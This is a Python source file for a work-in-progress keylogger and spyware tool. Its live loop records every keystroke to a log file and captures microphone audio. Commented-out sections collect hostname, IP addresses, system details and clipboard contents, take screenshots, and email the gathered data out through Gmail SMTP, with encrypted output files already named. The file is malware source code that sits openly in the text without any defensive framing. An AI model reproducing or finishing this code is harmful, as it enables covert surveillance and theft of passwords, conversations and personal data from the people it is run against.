# Libraries

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import platform

import clipboard # Using clipboard instead of win32clipboard

from pynput.keyboard import Key, Listener

import time
import os

from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet

import getpass
from requests import get

from multiprocessing import Process, freeze_support
from PIL import ImageGrab

from datetime import datetime

# Variables

system_information = "system.txt"
audio_information = "audio.wav"
clipboard_information = "clipboard.txt"
screenshot_information = "screenshot.png"
keys_information = "key_log.txt"

system_information_enc = 'enc_system.txt'
clipboard_information_enc = 'enc_clipboard.txt'
keys_information_enc = 'enc_keys_logged.txt'

# Email - https://medium.com/@abdullahzulfiqar653/sending-emails-with-attachments-using-python-32b908909d73

# sender_email = os.environ['SENDER_EMAIL']
# sender_emails_pwd = os.environ['SENDER_EMAIL_PWD']
# receiver_email = os.environ['RECEIVER_EMAIL']

# smtp_session = smtplib.SMTP('smtp.gmail.com', 587)
# smtp_session.starttls()
# smtp_session.login(sender_email, sender_emails_pwd)
# message = "Testing3 to see if I can send emails through Python"
# smtp_session.sendmail(sender_email, receiver_email, message)
# smtp_session.quit()

# Computer Information

# hostname = socket.gethostname()
# internal_IP = socket.gethostbyname(hostname) # Usually returns loopback address

# s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) 
# s.connect(("8.8.8.8", 80))
# private_IP = s.getsockname()[0] # Will return the private IP of the machine

# external_IP = get('https://api.ipify.org').text

# processor_info = platform.processor()
# system_info, system_ver = platform.system(), platform.version()
# machine_info = platform.machine()

# f = open(system_information, 'a')

# f.write('Hostname: ' + hostname + '\n' +
#         'Internal IP: ' + internal_IP + '\n' +
#         'Private IP: ' + private_IP + '\n' +
#         'External IP: ' + external_IP + '\n' +
#         'Processor Info: ' + processor_info + '\n' +
#         'System Info: ' + system_info + '\n' + 
#         'System Version: ' + system_ver + '\n' +
#         'Machine Info: ' + machine_info + '\n' +
#         'Clipboard Contents: ' + '\n\t' + clipboard.paste() + '\n')

# f.close()

# Screenshotting

# screenshot = ImageGrab.grab()
# screenshot.save("screenshot.png")
# screenshot.close()

# Timer

#current_date_time = datetime.now().time() # This provides human readable time. But for mathematical simplicity we use time.time()

no_of_iterations = 1
current_iteration = 0
iteration_duration = 15

while current_iteration < no_of_iterations:
    
    #Microphone & Keyboard Logging

    def on_press_func(key):
        try:
            if time.time() > stopping_time:
                listener.stop()
            else:
                f.write(key.char)
        except AttributeError:
            f.write('(' + str(key) + ')')

    sampling_freq = 44100
    duration = iteration_duration

    myrecording = sd.rec(int(duration * sampling_freq), samplerate=sampling_freq, channels=2)

    f = open(keys_information, 'a')

    stopping_time = time.time() + iteration_duration

    with Listener(
            on_press=on_press_func) as listener:
        listener.join()

    f.close()

    sd.wait()

    write(audio_information, sampling_freq, myrecording)

    current_iteration += 1

    # if time.time() > stopping_time:
    #     pass
    #     # Screenshot
    #     # Clipboard contents
    #     # Computer Info
    #     # Email above info
    #     # incremenet iteration by 1
    #     # new timing logic